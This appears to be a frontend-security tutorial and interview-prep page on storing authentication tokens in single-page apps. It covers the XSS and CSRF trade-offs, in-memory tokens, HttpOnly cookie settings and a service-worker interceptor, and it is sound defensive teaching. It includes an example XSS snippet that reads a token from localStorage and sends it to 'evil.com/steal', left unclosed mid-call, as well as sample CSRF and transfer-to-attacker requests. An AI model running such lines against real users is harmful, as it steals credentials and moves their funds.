2. The XSS vs CSRF Trade-off

// The fundamental security tension in token storage:
//
// If JS CAN access the token → XSS can steal it
// If JS CANNOT access the token → must use cookies → CSRF risk
//
// Option A: localStorage
//   ✅ CSRF-safe (not auto-sent)
//   ❌ XSS: any injected script reads localStorage.getItem('token')
//   ❌ Persistent: token survives until explicitly deleted
//   ❌ Token exfiltration: attacker sends to their server → replay from anywhere
//
// Option B: HttpOnly cookie
//   ✅ XSS-safe (JS can't read the cookie)
//   ❌ CSRF: browser auto-sends on every request
//   → Mitigate with SameSite=Lax + CSRF token
//
// Option C: Memory (best of both worlds, with trade-off)
//   ✅ CSRF-safe (not auto-sent)
//   ⚠️ XSS can still read it (it's a JS variable)
//   BUT: attacker can't exfiltrate for replay (lost on page close)
//   ❌ Lost on refresh → need silent refresh mechanism

3. Why Memory + HttpOnly Cookie is Best

// The recommended architecture:
//
// Access Token → JavaScript variable (memory)
//   • Used for API calls: Authorization: Bearer <token>
//   • Short-lived (5-15 min)
//   • If XSS happens: attacker has 5 min window, can't persist
//   • Not auto-sent → no CSRF
//
// Refresh Token → HttpOnly SameSite=Strict Secure cookie
//   • Sent only to /auth/refresh endpoint (Path=/auth)
//   • Long-lived (7-30 days)
//   • XSS can't read it (HttpOnly)
//   • CSRF blocked by SameSite=Strict
//   • Rotated on every use → theft detected if old token reused
//
// On page load: POST /auth/refresh → new access token in response body
// On token expiry: same silent refresh
// On logout: server revokes refresh token, clears cookie

const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: token,

// Token is now on attacker's server → can replay from anywhere
// Even after XSS is fixed, token is valid until expiry

// <form action="https://api.bank.com/transfer" method="POST">
//   <input name="to" value="attacker">
// </form>
// Browser sends session cookie automatically
// Blocked by: SameSite=Lax (no cookie on cross-site POST)

// XSS can still call your APIs in the user's context:
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer ' + window.__token },
  body: JSON.stringify({ to: 'attacker' }),
});
// But: can't exfiltrate token for offline replay
// Token dies when user closes tab
// CSP with connect-src blocks exfiltration to external domains

FAANG Interview Questions

Q1: Where should a production SPA store authentication tokens?
Access token in a JavaScript closure/module variable (memory). Refresh token in an HttpOnly, Secure, SameSite=Strict cookie with a narrow Path (/auth/refresh). This minimizes both XSS and CSRF attack surfaces. The access token in memory can't be persisted by an attacker (lost on page close) and isn't auto-sent (no CSRF). The refresh token in HttpOnly can't be read by XSS, and SameSite=Strict blocks cross-site sending. The trade-off: on page refresh, the access token is lost — but we silently call POST /auth/refresh to get a new one. This adds a brief loading state on page load, but the security benefit is worth it. For the best UX, I'd pre-fetch the refresh on the initial HTML load using a server-side middleware or inline script.
Follow-up: How does this change with SSR (Next.js)?
Q2: A developer on your team wants to store JWT in localStorage for simplicity. How do you respond?
I'd explain the risk concretely: localStorage is accessible to any JavaScript on the page. If we have a single XSS vulnerability — through a third-party script, user-generated content, or even a browser extension — the attacker can read the JWT and send it to their server. They can then replay that token from any device until it expires. This is called "token exfiltration." With cookies (HttpOnly), XSS can make API calls in the user's context but can't steal the credential for offline replay — the blast radius is limited. With memory storage, even if XSS reads the token, it can't survive a page close. I'd offer to help set up the silent refresh pattern — it's about 50 lines of code and dramatically reduces the attack surface. If the team pushes back, at minimum use sessionStorage (not persistent) and very short token lifetimes (5 min).
Follow-up: What if the app needs to work offline?
Q3: Explain the Service Worker token storage pattern.
The Service Worker sits between the page and the network. It can intercept all fetch requests and attach the token from its own isolated storage. The key security benefit: the token never enters the main page context. Even if XSS compromises the page, the attacker can't directly read the Service Worker's variables or IndexedDB. The SW receives the token from the auth server (via a controlled fetch), stores it in its scope, and on every intercepted request to the API domain, attaches the Authorization header. Limitations: (1) Service Workers have delayed startup — first request might miss the interception. (2) Can't intercept navigation requests. (3) Debugging is harder. (4) A sophisticated XSS could register its own SW or use postMessage to trick the existing one. So it's defense-in-depth, not bulletproof. The BFF pattern is generally preferred for production because the token never reaches the browser at all.
Follow-up: Can an XSS attack register a new Service Worker to intercept tokens?

1. In-Memory Token Manager

// Encapsulate token in closure — not on window or global
const createTokenManager = () => {
  let _token = null;
  let _expiry = 0;

  return {
    setToken(token, expiresIn) {
      _token = token;
      _expiry = Date.now() + expiresIn * 1000;
    },
    getToken() {
      if (_token && Date.now() < _expiry) return _token;
      return null;
    },
    clear() {
      _token = null;
      _expiry = 0;
    },
  };
};

const tokenManager = createTokenManager();

// Usage in fetch wrapper:
async function authFetch(url, options = {}) {
  let token = tokenManager.getToken();
  if (!token) {
    token = await silentRefresh();
  }
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`,
    },
  });
}

2. Service Worker Token Interceptor

// sw.js — stores token in ServiceWorker scope
let accessToken = null;

self.addEventListener('message', (event) => {
  if (event.data.type === 'SET_TOKEN') {
    accessToken = event.data.token;
  }
  if (event.data.type === 'CLEAR_TOKEN') {
    accessToken = null;
  }
});

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);

  // Only attach token to API requests
  if (url.pathname.startsWith('/api/') && accessToken) {
    const authRequest = new Request(event.request, {
      headers: new Headers({
        ...Object.fromEntries(event.request.headers),
        'Authorization': `Bearer ${accessToken}`,
      }),
    });
    event.respondWith(fetch(authRequest));
  }
});

Storage Decision Flowchart

Is it a server-rendered app (SSR)?
  YES → HttpOnly cookie for all tokens
  NO ↓

Does the API live on same origin?
  YES → Memory (access) + HttpOnly cookie (refresh)
  NO ↓

Can you add a BFF proxy?
  YES → BFF holds tokens, SPA uses session cookie to BFF
  NO → Memory (access) + HttpOnly cookie (refresh) with CORS

Never → localStorage / sessionStorage for production auth tokens

Cookie Configuration Reference

// Optimal cookie settings for refresh token:
Set-Cookie: refresh_token=<opaque>;
  HttpOnly;           // JS can't read → XSS safe
  Secure;             // HTTPS only → no cleartext
  SameSite=Strict;    // No cross-site sending → CSRF safe
  Path=/auth;          // Only sent to auth endpoints
  Max-Age=2592000;    // 30 days
  Domain=.example.com; // Shared across subdomains if needed

// Optional CSRF cookie (Double Submit):
Set-Cookie: csrf=<random>;
  SameSite=Strict;
  Secure;
  Path=/;
  // NOT HttpOnly → JS reads this to send in header
